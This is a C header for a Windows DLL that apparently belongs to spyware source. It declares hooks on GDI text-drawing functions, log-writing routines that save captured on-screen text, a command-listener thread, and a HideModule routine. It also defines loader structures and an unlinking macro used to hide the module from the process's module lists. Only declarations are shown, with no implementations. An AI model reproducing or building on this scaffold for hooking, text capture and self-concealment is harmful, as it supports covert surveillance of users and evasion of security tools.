#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#include <MsXml2.h>
#import <msxml3.dll> named_guids

#include "xml.h"

#include "zdisasm.h"
#include "Array.h"




#define PUSH_ALL_REG __asm pushad
#define POP_ALL_REG  __asm popad


void delFuncHooks();
void setFuncHooks(char *szHookFunc);
DWORD WINAPI _rand(DWORD _max);
DWORD WINAPI _prandom(DWORD _min,DWORD _max);
unsigned long _random();
PVOID Hook(PVOID Addr, PVOID NewFunc);
void UnHook(PVOID Addr, PVOID CallGate);
void MyMemCpy(void* Dst,void *Src,int _size);
int GetLineSize(int buf_size,char *buf);
void MySetMemory(PVOID buf,int val,int bufSize);
BOOL WINAPI New_TextOutW(HDC hdc,int nXStart,int nYStart,LPCTSTR lpString, int cbString);
int WINAPI New_DrawTextW(HDC hDC,LPCTSTR lpString,int nCount,LPRECT lpRect,UINT uFormat);
BOOL WINAPI New_ExtTextOutW(HDC hdc,int X,int Y,UINT fuOptions,CONST RECT* lprc,LPCTSTR lpString,UINT cbCount,CONST INT* lpDx);
BOOL WINAPI New_ExtTextOutA(HDC hdc,int X,int Y,UINT fuOptions,CONST RECT* lprc,LPCTSTR lpString,UINT cbCount,CONST INT* lpDx);
int WINAPI New_DrawTextExW(HDC hdc,LPTSTR lpchText,int cchText,LPRECT lprc,UINT dwDTFormat,LPDRAWTEXTPARAMS lpDTParams);
void writeLogFile(char *Data);
BOOL WINAPI New_GetTextExtentPointW(HDC hdc,LPCTSTR lpString,int cbString,LPSIZE lpSize);
void* MyRealloc(void *buf,int len);
void MyFree(void *buf);
WCHAR* CharToWChar(char* szString);
char* WCharToChar(WCHAR* wString);
DWORD WINAPI CommandListenerThread(LPVOID lpParameter);
DWORD WINAPI HookInfoThread(LPVOID lpParameter);
void HideModule(HMODULE hModule);
void writeLogFile(void* Data,int dataSize);
void saveText(HDC hDC,char *szData,int szDataSize,char *str1,int x,int y);


DWORD writeFile(char *szfPath,char *Data,int DataSize,int CreationDisposition,int Attr);
unsigned int WINAPI CalcHash(char *string);

typedef BOOL (WINAPI *pTextOutW)(HDC hdc,int nXStart,int nYStart,LPCTSTR lpString,int cbString);
typedef BOOL (WINAPI *pTextOutA)(HDC hdc,int nXStart,int nYStart,LPCTSTR lpString,int cbString);

typedef int (WINAPI *pDrawTextW)(HDC hDC,LPCTSTR lpString,int nCount,LPRECT lpRect,UINT uFormat);
typedef int (WINAPI *pDrawTextA)(HDC hDC,LPCTSTR lpString,int nCount,LPRECT lpRect,UINT uFormat);

typedef int (WINAPI *pDrawTextExW)(HDC hdc,LPTSTR lpchText,int cchText,LPRECT lprc,UINT dwDTFormat,LPDRAWTEXTPARAMS lpDTParams);
typedef int (WINAPI *pDrawTextExA)(HDC hdc,LPTSTR lpchText,int cchText,LPRECT lprc,UINT dwDTFormat,LPDRAWTEXTPARAMS lpDTParams);

typedef BOOL (WINAPI *pExtTextOutW)(HDC hdc,int X,int Y,UINT fuOptions,CONST RECT* lprc,LPCTSTR lpString,UINT cbCount,CONST INT* lpDx);
typedef BOOL (WINAPI *pExtTextOutA)(HDC hdc,int X,int Y,UINT fuOptions,CONST RECT* lprc,LPCTSTR lpString,UINT cbCount,CONST INT* lpDx);

typedef LONG (WINAPI *pTabbedTextOutA)(HDC hDC,int X,int Y,LPCTSTR lpString,int nCount,int nTabPositions,CONST LPINT lpnTabStopPositions,int nTabOrigin);
typedef LONG (WINAPI *pTabbedTextOutW)(HDC hDC,int X,int Y,LPCTSTR lpString,int nCount,int nTabPositions,CONST LPINT lpnTabStopPositions,int nTabOrigin);

typedef BOOL (WINAPI *pGetTextExtentPointW)(HDC hdc,LPCTSTR lpString,int cbString,LPSIZE lpSize);

typedef struct _UNICODE_STRING {
  USHORT  Length;
  USHORT  MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


typedef struct _LDR_MODULE {
LIST_ENTRY InLoadOrderModuleList;
LIST_ENTRY InMemoryOrderModuleList;
LIST_ENTRY InInitializationOrderModuleList;
PVOID BaseAddress;
PVOID EntryPoint;
ULONG SizeOfImage;
UNICODE_STRING FullDllName;
UNICODE_STRING BaseDllName;
ULONG Flags;
SHORT LoadCount;
SHORT TlsIndex;
LIST_ENTRY HashTableEntry;
ULONG TimeDateStamp;
} LDR_MODULE, *PLDR_MODULE;



typedef struct _PEB_LDR_DATA
{
         ULONG Length;
         UCHAR Initialized;
         PVOID SsHandle;
         LIST_ENTRY InLoadOrderModuleList;
         LIST_ENTRY InMemoryOrderModuleList;
         LIST_ENTRY InInitializationOrderModuleList;
         PVOID EntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA;


#define CUT_LIST(item) \
    item.Blink->Flink = item.Flink; \
    item.Flink->Blink = item.Blink



typedef struct __word_info
{
	int x;
	int y;
	char *word;
	UINT hash;
	HDC hdc;
}word_info;

#include "myArraySort.h"

typedef struct __words_info
{
	int y;
	myArraySort	*words;
}words_info;

